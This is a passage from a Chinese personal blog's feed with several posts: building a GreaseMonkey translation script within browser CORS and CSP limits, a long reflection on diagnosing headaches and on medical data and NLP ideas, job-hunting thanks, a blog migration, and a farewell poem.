<p>设计是最简单的一环，后面你会看到时间都花到哪里了。</p>
<h2 id="知易行难">知易行难</h2><p>通过谷歌，很容易完成第一步，在脚本中得到选中的文字。</p>
<p>第二步就开始面临问题。作为前信息安全专业从业者，很清楚ajax这种东西跨域是受限制的。稍微翻阅scriptish文档发现GM_xmlhttpRequest可以满足我的需求。</p>
<p>除却和  <code>XMLHttpRequest</code>这种东西并不太一样的api造成的各种细节错误，之后碰到的问题是我整个开发过程最棘手、花费时间最长的问题。</p>
<p>无论onload、onerror还是onreadystate的回调中，<code>GM_log</code>都没有打印出任何信息。</p>
<p>firebug和火狐内置调试器也没有显示任何通信。这和我在网络上看到的GreaseMonkey相关信息并不太相符。</p>
<p>经检查脚本元数据<code>@grant</code>，觉得已经授权这个跨域函数也没什么问题。</p>
<p>折腾一阵，确认API调用和细节都无法确认问题后，采取曲线调试方案。</p>
<p>更改请求地址到本地，确认请求确实发出了。那么，它有返回吗？</p>
<p>在本地用netcat模拟返回数据，仍然没有打印任何信息。我开始怀疑难道GM_xmlhttpRequest是会对返回结果做验证？必须报头正确？</p>
<p>第一天就这么过去了。</p>
<p>第二天我决定尝试代理来看来往的通信是否正常。</p>
<p>方便起见，先用nc充当了下代理，检查了下相互通信，未见有什么不对的。</p>
<p>为严谨起见，用burpsuite来设置一个透明本地代理，让浏览器指向那个代理。经过检验，完全没看出通信有什么问题。但onload和其他回调也不会被触发。</p>
<p>谷歌搜索得到一些stackoverflow、github issue和greasewiki上的信息，但问题仍不能确认和解决。</p>
<p>只是昨天晚上baidu时心心念念，发现firefox贴吧里有人吐槽scriptish不稳定的一些地方，今天又看到一些讨论，决定换回GreaseMonkey试试，事实证明这是明智的。</p>
<p>然而，一换发现什么都打印不出来了。后来反复尝试，发现GM_log不能用，我简直震惊了，wiki上写着玩的么，还是有什么变化。反正我发现console.log可以使用，那就继续开发下去了。</p>
<p>最难的部分就这么糊里糊涂过去了。</p>
<h2 id="数据请求顺风顺水">数据请求顺风顺水</h2><p>一旦请求完成，解析json数据，按需展示就是水到渠成的事情。</p>
<p>然而，并不是那么简单。</p>
<h2 id="JS异步与回调之难">JS异步与回调之难</h2><p>JS的异步特性带来了这些不符合人类直观思维方式的流程控制风格。</p>
<p>按理说我应该很习惯javascript的异步操作流程控制的种种问题，但还是踩了次坑。</p>
<p>弹出和渲染tooltip的函数没有读到返回数据！</p>
<p>好在对javascript程序员debug这种问题比之前的问题简单太多。一看想起来GM_xmlhttpRequest是异步过程，而不是同步，我这里却要待异步过程返回结果再执行下一个函数。</p>
<p>想想promise应该不用，虽然firefox41肯定原生支持ES6 promise了。但，就这点函数干脆。。。还是回调“地狱”吧。</p>
<h2 id="JS难中有易">JS难中有易</h2><p>说到ES6，ES6提供了很多方便javascript编程的好东西，通过<code>let</code>和<code>=&gt;</code>实现更好的this和作用域一致，通过<code>Template</code>方便字符串操作等等。</p>
<p>很庆幸，GreaseMonkey的话我只考虑firefox用户，反正好早的时候这些ES6特性浏览器都支持了。</p>
<h2 id="JS易中又难">JS易中又难</h2><p>JS让人非常难过的一个地方，是DOM操作和各种webAPI。只能说丧心病狂。你记得清楚如何获得viewport区域大小么？知道如何获得鼠标相对viewport位置么？知道为啥获取区域高度或宽度并没有获得么？看到clientWidth、offsetWidth、availWidth…有没有想砍人？</p>
<p>为了让脚本能正确在屏幕边缘让tooltip出现在viewport内，在各种边界条件数学计算题这里又纠结了好久。</p>
<p>GreaseMonkey相比Scriptish少了一个比较方便的特性： <code>@css</code>。虽然可以在head标签中通过<code>GM_addStyle()</code>来注入样式，我总觉得会不合时宜的覆盖不该覆盖的东西，我对Google Translate Tooltip在阮一峰大大的网站上奇葩的样式表现印象深刻。所以，还是选择在DOM中注入的样式。</p>
<p>这是体力活，你说体力活难不难呢？</p>
<h2 id="最难的部分">最难的部分</h2><p>安全是最难以面对的一个问题。之所以，很多标签、脚本在页面上失效，都是由于近年来浏览器越来越严格的安全策略。我在开发这个脚本时碰到了两点：</p>
<ol>
<li>在https网站页面中无法加载http的资源。在调试工具中可以看到<a href="https://developer.mozilla.org/en/docs/Security/MixedContent" target="_blank" rel="external">mixed content</a>的字样。</li>
<li>如果网站报头中有CSP限制。调试工具中也能看到提示。</li>
</ol>
<p>问题一，可以通过GM_xmlhttpRequest方法实现混合协议内容，如果外部资源也支持https请求也行。当我开发发音功能时就发现有道的语音api可以用https访问。</p>
<p>问题二，只能通过各种CORS技术实现(参见附录)。<del>我还没开始做。</del>但看到<a href="http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte" target="_blank" rel="external">Stackoverflow上有个示例</a></p>
<blockquote>
<p>你确定要通过打开<code>about:config</code>禁用firefox对CSP的支持吗？</p>
</blockquote>
<p>不！！</p>
<p>通过<code>GM_xmlhttpRequest</code>完成异步请求，将数据用浏览器播放出来实现跨域资源引用。这样，在一定程度上并不降低浏览器安全性，却能够实现需求，完成功能。</p>
<p>Cheers！</p>
<h2 id="附录">附录</h2><ul>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=866522" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=866522</a></li>
<li><a href="https://github.com/greasemonkey/greasemonkey/issues/2046" target="_blank" rel="external">https://github.com/greasemonkey/greasemonkey/issues/2046</a></li>
<li><a href="http://forums.mozillazine.org/viewtopic.php?f=38&amp;t=2958293" target="_blank" rel="external">http://forums.mozillazine.org/viewtopic.php?f=38&amp;t=2958293</a></li>
<li><a href="http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte" target="_blank" rel="external">http://stackoverflow.com/questions/28554022/how-can-i-play-sound-with-a-greasemonkey-script-in-firefox-when-theres-a-conte</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这两天，写了一个简单的基于有道在线翻译的GreaseMonkey屏幕取词脚本。</p>
<p><a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我回来了]]></title>
    <link href="http://reverland.org/life/2015/11/12/i-am-back/"/>
    <id>http://reverland.org/life/2015/11/12/i-am-back/</id>
    <published>2015-11-11T16:00:00.000Z</published>
    <updated>2015-11-18T10:18:25.431Z</updated>
    <content type="html"><![CDATA[<h2 id="看病与思考">看病与思考</h2><p>昨日，很遗憾听说一个朋友的兄弟在出车祸之后一个月后，终于还是走了。生死去来，棚头傀儡，一线断时，落落磊磊。</p>
<p>前几个月，我也很难过，一度不知道面对的是什么。我想说说看病的经历。</p>
<p>症状是头疼，疼得特别厉害，晚上睡不着、或者睡着了半夜疼醒。眼眶下边，有时候太阳穴上头，耳朵旁边都会疼。</p>
<p>总共去北邮社区医院耳鼻喉、口腔，北医三院耳鼻喉、神经内科(头疼专科)，某市中心医院耳鼻喉科、神经内科、眼科，北京协和医院神经内科、耳鼻喉科、口腔科，一直到最后把牙拔掉，终于头疼停歇了。</p>
<p>我想重点说说感受</p>
<ol>
<li><p>医生的经验往往是领域内，有更好的判断力。比如神经内科的专家告诉我，你这个比较奇怪，一般我们只考虑头部而不是面部的疼痛。而且头疼的原因很复杂，百分之八十根本找不出原因。再比如耳鼻喉的专家告诉我，你这个鼻窦囊肿根本没什么事，建议去神经科检查。再比如头疼专科专家做了一系列排除后让我复查鼻窦CT，如果发现问题还是去耳鼻喉。比如我怀疑牙齿或周边问题，可是非口腔科医生一个没看出问题，还有似乎没看清还带手套摸了下说没问题的社区医院口腔科医生。</p>
</li>
<li><p>症状关联还是要靠自己。要清晰记录、准确描述自身症状。我一路看下去，各科医生也不能确保问题在哪里，倒是自己去问，会不会因为牙齿的问题造成的囊肿，要不要还看下口腔科。后来发现疼痛发作时间和牙疼的规律有些相像，另外就是有时候刷牙或者漱口会造成头猛地一疼。后来一天刷四次牙竟然不怎么疼了更让我怀疑。。。</p>
</li>
<li><p>看病不容易，挂号难，等了一周可能就看那么一会儿。检查有可能也要预约，做完检查还要等取结果。等啊等。。。</p>
</li>
</ol>
<h3 id="反馈">反馈</h3><p>在北京看病是一个很长的周期，特别是疾病很难在某个领域内精确诊断时，往往都是在各大医院辗转求医。去协和头疼专科的时候，一个阿姨给我展示她的病历，厚厚的一本上写满了在各大医院的辗转的诊断、治疗信息。时间跨度长达数年，病情反反复复，原因则不明。一方面，零散在各地的医院积累了大量的诊断信息、治疗信息。另一方面，医生一般很难收到门诊病人的反馈。</p>
<p>好在有很多医生在病房。然而，反馈真是个很重要的东西。可惜我最后去拔了牙，之前的所有的医生都不会得到反馈这个症状可能和牙有关系，估计他们忙碌接待了成百上千各式各样的人，也不会记得某些——特例吧。</p>
<p>反馈很重要。北医三院神经科专家李坚当时对我的症状把边边角角都想了想，最后推荐去宣武医院一位医生那里看看去排除下极度罕见的特例。因为他的一位患者曾经给过他反馈，他印象比较深刻。</p>
<p>我校医院口腔科医生现在都不知道我智齿蛀牙这么厉害，但我也不可能跑回去跟她说当时你没看清、也没摸出来，智齿其实缺了一块。。。</p>
<p>我想，也许只是个美好的远景，商业大数据不应该仅仅应用到娱乐和消费之上，更多的应该能服务于我们生活的基础、生活的方方面面。希望互联网能促进传统医疗行业的数字化和高度整合，基于数据驱动开创新的医疗模式。这对参与者是商机，也是降低整个医疗成本的关键。</p>
<p>目前就自己搜集资料和使用的体验上来看，好大夫是首屈一指的高质量医患交流平台、春雨医生也还不错，可能主要移动端的不怎么能靠搜索引擎检索到，但响应速度挺快。<br>丁香园平台内容据说很优质，可惜搜索引擎也检索不到相关信息，需要注册登录。</p>
<h3 id="愿景">愿景</h3><p>个人希望将来的医疗信息平台是：</p>
<ol>
<li>基本开放的。可以通过搜索引擎高效检索，而不是在信息上设置层层权限和障碍。这一点，非常喜欢好大夫，有些权限控制来保护患者隐私，但其他信息一般不会不可见。医生有时候也会发些不错的科普文哈哈。</li>
<li>高质量的。有专业的医生和认真对待自己病情的患者。有热衷分享和共同创造价值的开放社区。社区对品质和贡献有追求。有些网站的质量简直不忍直视，一看都是复制粘贴。</li>
<li>数据驱动的。不知道该不该寄希望于那些赚得钵满盆满，牛逼吹得天花乱坠，在推动娱乐文化和消费狂潮上无所不用其及的互联网企业们。商机和风险必然是相伴而生，目前看，医疗相关的互联网企业似乎还是需要偏运营更多才能勉强生存。O2O才是各个企业的重点。行业达到了一定的原始数据和资金积累之后，应该会有更多技术上追寻进步的力量去改善整个医疗行业的未来吧。</li>
</ol>
<h3 id="关联分析">关联分析</h3><p>当时，头疼找不出原因的时候。开始记录疼痛和生活点滴做关联。事实上，源于早前在<a href="http://eloquentjavascript.net/04_data.html" target="_blank" rel="external">Eloquent Javascript中的有趣例子</a>。</p>
<p>之后，一直想做这些吧，一是一直对关联挖掘算法、NLP、机器学习的东西念念不忘。总觉得可以做点什么，能让疾病诊断这方面有点突破和改变。</p>
<p>可是，我个人的数据量小。这时候就发现好大夫这个网站用来做数据源是可能的。有次和周老板(话说，周老板他们和丁香园那边的冯某某都认识。。。)讨论百度口碑和淘宝大家印象的实现时，开始考虑来对医生、患者提问信息条目等等里头做主题分类一类的事情。大概想了下相关技术。</p>
<h4 id="数据获取">数据获取</h4><ol>
<li>数据的获取。爬虫自不用说，一般没有写不出的爬虫。基本上、Python和Nodejs都写过，觉得Python工具栈更全面成熟。效率我会考虑twisted而不是gevent，那个内存占用太吓人。</li>
<li>数据的清理。这是体力活。</li>
</ol>
<h4 id="NLP">NLP</h4><p>自然语言处理、主题模型等等。常用算法、模块基本都没问题。最最关键的是、做中文的时候， 特别是特定领域中文自然语言处理的时候，如果想在效率上提升、词典很重要。我大概看了下Matrix67当年关于分词发现的那篇博客，又对照了下某人的新词发现硕士论文。看了看HanLP和jieba分词的原理，瞄了瞄HMM和CRF分词的思想。最后自己实现了下Matrix67的算法玩(你敢信是用nodejs，结果后来RedHat的Bruno问，What do you do with Nodjs? 我说。。。String Manipulation…)。</p>
<p>另一方面，写的时候发现自己应该在NLP理论上学习更多，于是看了看<a href="http://www.nltk.org/book/" target="_blank" rel="external">NLTK book</a>，没想到，因为前一阵刚看完<a href="https://hacks.mozilla.org/category/es6-in-depth/" target="_blank" rel="external">Mozilla Hacks的ES6: In Depth系列</a>每次看到它介绍什么，我都想了想NLTK怎么实现的，在javascript中依托ES6该怎么实现。于是把他的FreqDist类在ES6中实现了，终于最后掉到Wordnet这个大坑里。。。开始在js上试图实现NLTK Wordnet Corpus Reader这种东西。顺便说下，写个稍微大点的东西才发现Python真是好啊真是好。所以RedHat的Bruno问，What do you do with Nodjs? 我说。。。String Manipulation我觉得再合适不过了)。</p>
<p>自己实现终究是玩，关键是知道有一票可用的比较高质量的NLP实现。python的有NLTK和果壳某位的snowNLP还有jieba，nodejs有NaturalNode，java啊go啊C++啊啥都有一大堆分词或者新词发现的东西。</p>
<p>一些不错的参考资料如下：</p>
<ul>
<li><a href="http://www.matrix67.com/blog/archives/5044" target="_blank" rel="external">互联网时代的社会语言学：基于SNS的文本数据挖掘</a>（虽然我觉得某个论文讲的更丰富，但论文这种东西，不接地气）</li>
<li><a href="http://www.isnowfy.com/introduction-to-chinese-segmentation/" target="_blank" rel="external">浅谈中文分词</a></li>
<li><a href="http://www.hankcs.com/nlp/" target="_blank" rel="external">Hankcs的各种文章</a>(他的机器学习数据挖掘笔记也值得一看)</li>
</ul>
<p>后来看NLTK了解了下Wordnet这种东西，额，有空再说吧，简单来说就是词、语义、近义词之间的复杂关系网络。</p>
<p>可是wordnet是英文词汇的，中文的质量、近义词语关联都是问题。</p>
<p>结合之前对淘宝大家印象的考虑。看到淘宝对每种标签印象还在评论中标明了相关语句。就简单思考了下怎么通过爬虫获取某宝的近义词/和对应句子数据，打开网络控制台看了看。然而并不知道我能拿来有什么用，做分词之后的tokenize？</p>
<p>反正，好奇心驱使着瞎看了很多也想了很多。真正做的精力却有限的只有未完成的英文Wordnet Corpus Reader、和Matrix67的算法对西游记和鲁迅全集并不觉得效果很好的分词算法实现。</p>
<p>对了，差点忘了NLTK这本书还在继续看，可是Wordnet Corpus Reader不做完我估计是看不下去了。。。感谢丁总还给我发了个电子版能在kindle上看= =</p>
<p>由于贵邮日了狗的毕业设计，对bag of n-gram算法，TFIDF以及如何利用Scikit Learn训练和交叉验证算是熟悉了。</p>
<p>最后，词语的获取，输入法的各种细胞词库、搜索引擎的热搜往往带来的新词啥的</p>
<h4 id="可视化">可视化</h4><p>数据来了之后，就是可视化的问题。WordNet之后就想可视化出来，准备用D3，在看NaturalNode的讨论时看到D3已经拆分，准备之后就看看这个数据驱动的。。。嗯。</p>
<p>算了，都只是设想。我就随便说说，你就随便听听。如能有半点波澜，也没有白花这么久写这么多。</p>
<h2 id="I’m_back|致谢">I’m back|致谢</h2><p>一方面，蛀牙拔掉之后头再没疼过，另一方面，校招早早地就如火如荼。校招走的三心二意。</p>
<p>结果是很多没打算过的阴差阳错有缘无分哈哈。截至现在，没有offer，却觉得这状态不好也好。</p>
<p>感谢这期间，关注过我，为我操心过的:</p>
<ul>
<li><a href="https://github.com/itomsawyer" target="_blank" rel="external">TomSawyer</a>和内推阿里前端的Li Dongmeng师兄</li>
<li><a href="http://armsword.com/" target="_blank" rel="external">Armsword</a>和领英中国内推我的Zhou Tong师兄</li>
<li><a href="http://reverland.org">我的腾讯一面面试官Wu Lijian</a></li>
<li>给了波Microsoft的内推的<a href="https://ichon.me/" target="_blank" rel="external">Chon</a>，好吧，我做了二十分钟笔试就去游泳了。</li>
<li>愿意为我推某安全创业公司的<a href="http://www.programlife.net/ctf-binary-tricks.html" target="_blank" rel="external">天枢Teacher G</a></li>
<li>直接向某互联网金融公司HRD推荐我的<a href="http://m.instrument.com.cn/" target="_blank" rel="external">周老板</a>，虽然因为实习问题就没有然后了。。。</li>
<li>还有<a href="https://github.com/sbilly" target="_blank" rel="external">sbilly大大</a></li>
<li>来自美团的碧水中的扯旗鱼</li>
<li>帮朋友内推头条的qiukun大神</li>
<li>帮朋友内推搜狗的<a href="https://github.com/lkasdolka" target="_blank" rel="external">lkasdolka</a></li>
<li>复试没去还打电话联系我又给硬安插了一次面试的的Tencent HR zyy</li>
</ul>
<p>我故不才，辜负了大家的期望= =，一直犹犹豫豫。</p>
<p>最近投了个Redhat的前端简历，虽然。。。Redhat根本不招前端基本都是java和kernel为主。。。但怎么说，真是一家和开源紧密联系的企业，我就参加了这一场宣讲，全都是讲开源去了。而且自从从greathaul那里听说了远程工作这个东西，其实，还是很有倾向。听到Fang Yue说到他一般在家工作眼睛感觉一亮</p>
<p>再看吧，感谢Bruno的关注和Jim Ma和Zhang Cheng的指教。还有组织Redhat活动的Charlie？和联系的HR们。在Redhat的工作，看上去真是很有挑战。嗯，不管怎样，我前所未有的觉得java大法好。</p>
<p>我一度觉得，自己干了太多没有意义的事情，时光如梭、岁月流逝，身边的人都承担起了自己的生活和他人的未来，我还是无所作为也没做啥有价值的事。</p>
<p>后来，看到<a href="https://github.com/taizilongxu/douban.fm/blob/13c68d2b1083eefe6ea162983b0de232469e1693/doubanfm/lrc2dic.py" target="_blank" rel="external">douban.fm中的某个文件</a></p>
<p>看到<a href="http://fangwang.me/2015/06/22/chinese-python-positions-analysis-based-on-lagou-data.html" target="_blank" rel="external">国内 Python 职位分析</a></p>
<p>看到<a href="http://www.scipy-lectures.org/preface.html#contributing" target="_blank" rel="external">scipy lecture notes的贡献者名单中</a>竟然有我。。。</p>
<p>偶然看到<a href="http://sterncat.github.io/all/optics/2015/03/22/Opticspy-develop.html" target="_blank" rel="external">一个光学python库</a>，简直是我还在学光学时梦寐以求的东西。没想到作者竟然是贵邮的，更没想到作者竟然说看过我的网站上的相位去包裹的两篇文章。虽然已然不知道是什么了。</p>
<p>等等。</p>
<p>我想吧，也好吧。就像当年受到那些对开源非常友好又充满热情的Linux用户，可能我都不记得他们是谁了，他们甚至只是记录了简单的甚至错误的东西。但他们的文章、笔记、天真烂漫的态度和热情则深深感染我并驱使和决定了我今后的人生轨迹。希望自己头晕脑胀记下的絮絮叨叨的只言片语，某些热情、坚韧和情怀，能播下哪怕一点点思维模因的种子。也许哪一天，我们所梦中的世界就真的在人间降临吧。</p>
<p>天空不曾留下痕迹，但我已飞过。就算再也不能飞。</p>
<p>我想说，别忘记在评论或者邮件给你赞许的人以反馈，人生短暂，珍惜每个有缘的人。</p>
<p>好多曾经关注的博客、人，渐渐消失在视野之中，愿他们从未走远，过去，现在，未来。</p>
<h2 id="从Jekyll迁移到Hexo">从Jekyll迁移到Hexo</h2><p>从jekyll迁移到了hexo。</p>
<p>其实不想迁移，我不想打破很多现有的东西。</p>
<p>jekyll要求ruby版本高于2.1. Ubuntu源里只到2.0。但我的笔记本散热不好，两次用rvm编译Ruby cpu过热直接灭了之后，还是用熟悉的node吧。话说，为了解决过热这种问题我把cpufrequtils和cpulimit都用上了。</p>
<p>详情请期待之后的文章。</p>
<h3 id="TODO">TODO</h3><ul>
<li>RSS</li>
<li>友链</li>
<li>评论</li>
<li>统计</li>
<li>分类、标签关于页面</li>
<li>我想改个主题</li>
<li>数学公式</li>
<li>简历等迁移</li>
</ul>
<p>暂时先这样，等整个站点完全改完了，就会把当前页面替换吧。现在关注的各位，对不住了，使用谷歌搜索检索本站吧。</p>
<p>感谢您一直看到这里。写了一天，论文一个字没写，好累。</p>
<p>Have fun!</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="看病与思考">看病与思考</h2><p>昨日，很遗憾听说一个朋友的兄弟在出车祸之后一个月后，终于还是走了。生死去来，棚头傀儡，一线断时，落落磊磊。</p>
<p>前几个月，我也很难过，一度不知道面对的是什么。我想说说看病的经历。</p>
<p>症状是头疼，疼得特别]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Maybe the Last Post Here]]></title>
    <link href="http://reverland.org/life/2015/08/07/maybe-the-last-post-here/"/>
    <id>http://reverland.org/life/2015/08/07/maybe-the-last-post-here/</id>
    <published>2015-08-06T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<p>花二十分钟，也许这将是这里最后一篇了。</p>
<p>随便扯些什么，反正二十分钟后我就该关上编辑器。已经将尽一个月没有打开vim，操作的熟悉感依然。</p>
<p>我还好好的活着，日子依然如旧，世界照常运转。</p>
<p>想应该爱过</p>
<p>想应该挣扎过</p>
<p>甚至向往过</p>
<p>破灭过</p>
<p>也追寻到一霎那的欢愉</p>
<p>转瞬即逝的成就感</p>
<p>觉得离她很近</p>
<p>觉得世界布满了光</p>
<p>觉得一切都像碧水那样。</p>
<p>莫说相公痴，更有痴似相公者</p>
<p>叹人间，美中不足今方信，便纵是举案齐眉，到底意儿难平</p>
<p>晓来谁染霜林醉，总是离人泪</p>
<p>觉得光明过觉得黑暗</p>
<p>心灰意冷过</p>
<p>坚持过</p>
<p>还没开始都放弃过</p>
<p>无所谓了。</p>
<p>整篇意识流，不要指望有什么中心思想</p>
<p>因为这是，</p>
<p>告别，</p>
<p>是</p>
<p>宣言</p>
<p>也是展望</p>
<p>更是一首不写给任何人</p>
<p>也是写给每个有缘的看客的诗</p>
<p>心似双丝网，中有千千结。</p>
<p>莫把幺弦拨，怨极弦能说</p>
<p>狂风落尽深红色，后面一句我打不出来了</p>
<p>我喜欢挺民谣</p>
<p>当你听到时</p>
<p>民谣就属于每个听者</p>
<p>它会是每个人独有的诗</p>
<p>落花有意随流水，流水。</p>
<p>无心</p>
<p>美中不足</p>
<p>好事多魔</p>
<p>一切有为法如梦幻泡影</p>
<p>如露亦如电</p>
<p>执念</p>
<p>执念</p>
<p>执念</p>
<p>终于还会破灭</p>
<p>我要告别</p>
<p>一片碧水丹心</p>
<p>一片痴情如梦</p>
<p>告别美丽的姑娘</p>
<p>告别难以割舍的校园</p>
<p>告别自由自在的岁月</p>
<p>我已经告别了家乡</p>
<p>告别了爹娘</p>
<p>告别了爱着的亲人</p>
<p>无能为力的让世界吞噬</p>
<p>告别了理想</p>
<p>告别了金色的梦乡</p>
<p>告别了无边的畅想</p>
<p>和天马星空的心</p>
<p>无所畏惧的心</p>
<p>坚韧不拔的心</p>
<p>这是首</p>
<p>写给秋天的歌</p>
<p>是一首写个夏天的挽歌</p>
<p>有多少个夏天可以重来</p>
<p>时光永远停在永无止境的八月</p>
<p>停在</p>
<p>四月是你的谎言</p>
<p>生死去来</p>
<p>棚头傀儡</p>
<p>一线断时</p>
<p>落落磊磊</p>
<p>千言万语千言万语</p>
<p>算了，没啥想说的</p>
<p>四年前</p>
<p>七年前</p>
<p>十二年前</p>
<p>二十年前</p>
<p>一百年前</p>
<p>千万年前</p>
<p>时间就这样</p>
<p>世界就这样</p>
<p>生老病死</p>
<p>无常变幻</p>
<p>有开始</p>
<p>就有结束</p>
<p>离恨恰似春草，更行更远还生</p>
<p>然而</p>
<p>挺不住</p>
<p>留不住</p>
<p>抓不住</p>
<p>再见</p>
<p>让我再说一万遍</p>
<p>时光都变成了烟</p>
<p>变成了楼下的柿子树</p>
<p>窗前的风</p>
<p>无人顾怜的窗前薄荷</p>
<p>和办公室一个人敲着无意义文字的我</p>
<p>再见</p>
<p>域名应该也要到期了</p>
<p>再见</p>
<p>就这样，所有无关紧要的</p>
<p>将烟消云散。</p>
<p>不是科学技术，不是钱，不是权利，是我们心中的圣光</p>
<p>成就我们的世界和生命的意义。</p>
<p>有缘认识你们真好。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>花二十分钟，也许这将是这里最后一篇了。</p>
<p>随便扯些什么，反正二十分钟后我就该关上编辑器。已经将尽一个月没有打开vim，操作的熟悉感依然。</p>
<p>我还好好的活着，日子依然如旧，世界照常运转。</p>
<p>想应该爱过</p>
<p>想应该挣扎过</p>
<]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[七月流火？]]></title>
    <link href="http://reverland.org/life/2015/07/03//"/>
    <id>http://reverland.org/life/2015/07/03//</id>
    <published>2015-07-02T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>沙上并禽池上瞑，云破月来花弄影。</p>
</blockquote>
<h2 id="摄影">摄影</h2><p>短暂的摄影生涯呢。康神给我留下了个Canon 60D玩，<a href="http://www.d0u9.xyz/" target="_blank" rel="external">D0u9</a>带着我玩了一阵，算是入了门，大致知道ISO，F数还有啥啥的都怎么回事，碰到光强的时候怎么办，阴天如何，什么时候拍照效果好，又科普了种种镜头滤镜，他在某本古老的摄影杂志上看来的种种技巧，关注的新闻中那些天马行空的户外摄影师和那些专注产品摄影的光影魔术师。</p>
<p>然后，我依然发现，感觉还没我用手机拍出来的效果好= =。。。</p>
<p>但科研楼天台上拍蓝天白云。远处的群山云影，历历在目。</p>
<p>在阴森的主楼厕所里拍主楼华灯初上，天际微白。</p>
<p>可是，我渣本处理这些巨大的RAW文件，简直卡到。。。</p>
<p>而且看不懂gimp那个UFRaw插件怎么用。。。</p>
<p>直到呢，有次给游泳队拍照，拍下了某某妹子没睁眼(原谅渣摄影！！！)，然后动手画上了一双水灵灵的大眼睛。。。我发给女主问她，女主竟然没发现！！！！！！！！！！！</p>
<p>我觉得，还是绘画更能表达人的情感，而摄影怎么也不可能还原我想看到的东西。</p>
<p>可是。。。我画的画都是这样的！！！！！！</p>
<p>![画]</p>
<h2 id="树莓派和山寨四轴">树莓派和山寨四轴</h2><p>D0u9入了个树莓派2,一直向我安利性能比1好了多少多少。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>沙上并禽池上瞑，云破月来花弄影。</p>
</blockquote>
<h2 id="摄影">摄影</h2><p>短暂的摄影生涯呢。康神给我留下了个Canon 60D玩，<a href="http://www.d0u9.xyz/" target="]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
</feed>
